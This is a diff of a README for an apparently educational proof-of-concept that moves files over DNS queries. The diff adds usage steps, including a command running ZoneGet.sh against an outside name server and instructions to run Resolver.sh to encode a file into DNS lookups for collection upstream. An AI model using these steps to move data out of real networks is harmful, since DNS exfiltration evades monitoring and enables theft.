@@ -15,12 +15,13 @@ This primarily is an intellectual exercise relating to practical information sec
 
 The use of DNS for data exfiltration or VPN has been a hacker trope for the nearly four decades that DNS has existed.  
 There have been several impliementations of this concept and this Proof of Concept is not unique. 
+Although this implementation is not based on the previous PoCs and there are certainly other ways to do this, all of that will live in [Erratum.txt](https://github.com/neitzert/FToDNS/blob/master/Erratum.txt)
 The recent introduction of [DNS over HTTPS](https://en.wikipedia.org/wiki/DNS_over_HTTPS) takes an already incendiary security issue and douses it with petroleum.
 
-This PoC is meant to be seen as your drunken neighbor playing with fireworks far too close for comfort.
+The PoC hope's to bring light to these challenges by playing with fireworks uncomfortably close to that incendiary security issue doused with petroleum. 
 
+Now, if you would please hold my beer,
 
-Although this implementation is not based on the previous PoCs, several interesting methods will be linked in the [Erratum.txt](https://github.com/neitzert/FToDNS/blob/master/Erratum.txt)
 
 ---
 
@@ -129,8 +130,13 @@ Where 'to put' a file is to copy towards and 'to get' a file is to copy from oth
 	1. Due to the complexity of the PoC, this will be broken down into multiple types of PoC
 		1. - [x]Direct Client to Server
 			1. - [x]Read file:  
+					Status complete
 					* Run: "./ZoneGet.sh bad.lan ns.rains.io payload > output.pdf"
 			1. - [x]Write file  
+					Status "ish"  works great in lab, bad in wild)
+					* Edit Resolver.sh to use your name server, read comments
+					* Run Resolver.sh YourFile.tla 
+					* ssh to server, extract as described in Resolver.sh
 		1. - [ ]Client to Recursive to Authoritative
 			1. - [ ]Read file
 			1. - [ ]Write file
@@ -165,7 +171,7 @@ This specific Proof of Concept creates several issues with its issuance and this
 	1. Query length
 	1. Text Encoding
 		1. Text format/encipherment
-		1. Chop length
+		1. Base64 Line length
 		1. Line numbering
 		1. add more here
 
@@ -176,7 +182,8 @@ This specific Proof of Concept creates several issues with its issuance and this
 
 ### Resolver.sh
 
-A simple script to encode a file into a very large number of DNS host look up queries for later collection and reassembly on the upstream DNS server 
+A simple script to encode a file into a very large number of DNS host look up queries for later collection and reassembly on the upstream DNS server.
+Works great on a closed test network.  Not so well on the greater internet.  Play with sleep timeout function. 
 
 
 ### ZoneGet.sh
@@ -194,9 +201,6 @@ Simple script to take a file and base64 encode it, write it into a DNS zone file
 
  
 ## Disclaimers 
-All standard disclaimers apply, no warranty, claims, or promises declared, made or implied.
-
-For educational, research, and entertainment purposes only. 
-
-Usability expires while you wait.
+All standard disclaimers apply, For educational, research, and entertainment purposes only. 
+Use at your own risk, Your Mileage May Vary, offer expires while you wait.
 
